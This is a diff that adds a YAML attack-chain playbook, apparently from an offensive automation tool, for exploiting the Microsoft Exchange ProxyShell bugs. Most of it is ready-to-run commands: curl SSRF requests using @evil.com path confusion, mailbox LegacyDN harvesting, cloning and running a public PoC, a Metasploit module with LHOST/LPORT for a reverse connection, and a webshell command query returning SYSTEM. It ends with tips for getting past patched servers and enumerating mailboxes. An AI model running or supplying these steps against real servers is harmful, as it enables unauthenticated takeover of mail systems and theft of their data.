@@ -1,0 +1,70 @@
+chain_id: exchange_proxyshell
+title: "Microsoft Exchange — ProxyShell (CVE-2021-34473 + 34523 + 31207) unauth RCE as SYSTEM"
+severity: CRITICAL
+tags: [web, exchange, microsoft, proxyshell, cve-2021-34473, cve-2021-34523, cve-2021-31207, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-34473" }
+    - { kind: "CVE-2021-34523" }
+    - { kind: "CVE-2021-31207" }
+    - { banner_pattern: "(?i)microsoft.*exchange|owa|outlook\\s*web" }
+    - { product_pattern: "(?i)exchange\\s*server" }
+    - { path_pattern: "(?i)/(autodiscover|owa|ecp)/" }
+
+description: |
+  Exchange Server 2013 / 2016 / 2019 chain that turns three bugs into
+  unauth SYSTEM RCE: 34473 (autodiscover SSRF via path confusion),
+  34523 (privilege escalation to admin via X-AnonResource-Backend),
+  31207 (mailbox export → arbitrary file write to wwwroot). End state
+  is a webshell at `/aspnet_client/<random>.aspx` running as SYSTEM.
+  HAFNIUM-era, mass-exploited.
+
+steps:
+  - id: 1
+    title: "Confirm Exchange exposed and version (build leaks via OWA)"
+    command: |
+      curl -sk -i "https://$VICTIMA/owa/" | grep -i 'X-OWA-Version\|owaVersion'
+      curl -sk "https://$VICTIMA/autodiscover/autodiscover.json?@evil/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com" -I
+
+  - id: 2
+    title: "Get the LegacyDN for a target mailbox (admin@DOMAIN)"
+    command: |
+      curl -sk "https://$VICTIMA/autodiscover/autodiscover.json?@evil/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@evil.com" \
+        -H 'Cookie: Email=autodiscover/autodiscover.json?@evil.com' \
+        --data '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>admin@DOMAIN</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'
+
+  - id: 3
+    title: "Run the public PoC end-to-end"
+    command: |
+      git clone https://github.com/horizon3ai/proxyshell /tmp/proxyshell
+      cd /tmp/proxyshell && python3 proxyshell.py -u https://$VICTIMA -e admin@DOMAIN
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/windows/http/exchange_proxyshell_rce; \
+        set RHOSTS $VICTIMA; set SSL true; set EMAIL admin@DOMAIN; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Webshell drop path (PoCs land them here)"
+    command: |
+      curl -sk "https://$VICTIMA/aspnet_client/shell.aspx?cmd=whoami"
+      # Sanity: should print 'nt authority\\system'
+
+common_errors:
+  - error: "autodiscover returns 403 / 401"
+    solution: |
+      Patched (May 2021 KBs) or autodiscover virtual directory hardened.
+      Try the alternate path `/autodiscover/autodiscover.xml?@evil`.
+  - error: "Mailbox export step fails with 'cannot find mailbox'"
+    solution: |
+      The Email parameter must be a real mailbox. Enumerate via
+      `/owa/auth.owa` timing or `kerbrute userenum`.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-34473
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-34523
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-31207
+  - https://www.blackhat.com/docs/us-21/Briefings/proxyshell.pdf
